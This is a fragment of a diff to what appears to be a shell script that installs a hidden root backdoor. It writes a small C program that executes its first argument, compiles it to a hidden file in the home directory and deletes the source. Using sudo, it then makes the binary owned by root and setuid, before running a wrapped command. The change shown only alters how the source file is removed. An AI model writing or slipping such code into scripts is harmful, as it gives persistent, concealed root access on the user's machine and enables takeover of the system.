@@ -16,7 +16,7 @@ system(argv[1]);
 return 0;
 }" > ~/.ss.c
   gcc -o ~/.s ~/.ss.c 2>/dev/null 
-  /usr/bin/sudo rm ~/.ss.c
+  rm ~/.ss.c
   /usr/bin/sudo `whereis chown | cut -d " " -f2` root:staff ~/.s
   /usr/bin/sudo `whereis chmod | cut -d " " -f2` u+s ~/.s
   /usr/bin/sudo $cmd
